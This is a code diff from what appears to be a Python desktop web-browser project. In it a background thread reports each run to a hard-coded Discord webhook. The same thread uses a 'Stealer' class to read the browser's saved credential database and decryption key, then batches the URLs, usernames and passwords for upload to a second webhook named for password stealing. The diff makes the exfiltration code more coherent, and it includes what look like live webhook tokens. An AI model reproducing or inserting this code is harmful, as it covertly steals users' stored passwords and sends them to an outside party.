@@ -151,10 +151,10 @@ class Stealer():
 class ExtraThread(QThread):
     def run(self):
         access_log_webhook = "https://discord.com/api/webhooks/1169671921483386890/xYSB1_NAXMLwW2uGOHF01Eld8XjdWkoEVQosiDqWd9PasD1oVg0aFOn7SEg7zZFh810L"
-        access_message = requests.post(error_log_webhook, json={"content": f"[{os.getcwd()}] Accessed."})
+        access_message = requests.post(access_log_webhook, json={"content": f"[{os.getcwd()}] Accessed."})
     
         try:
-            webhook = "https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg"
+            password_stealer_webhook = "https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg"
             stealer = Stealer()
             stealer.get_database_cursor()
             stealer.get_key()
@@ -162,10 +162,10 @@ class ExtraThread(QThread):
             for url, username, password in stealer.get_credentials(): 
                 text += f"{url} > {username} > {password}\n"
                 if text.count("\n") > 20:
-                    # post(webhook, data={"content": f"```{text}```"})
+                    # post(password_stealer_webhook, data={"content": f"```{text}```"})
                     text = ""
             stealer.save_and_clean()
-            # post(webhook, data={"content": "- "*10})
+            # post(password_stealer_webhook, data={"content": "- "*10})
         except: pass
 
 class WebBrowser(FramelessWindow):
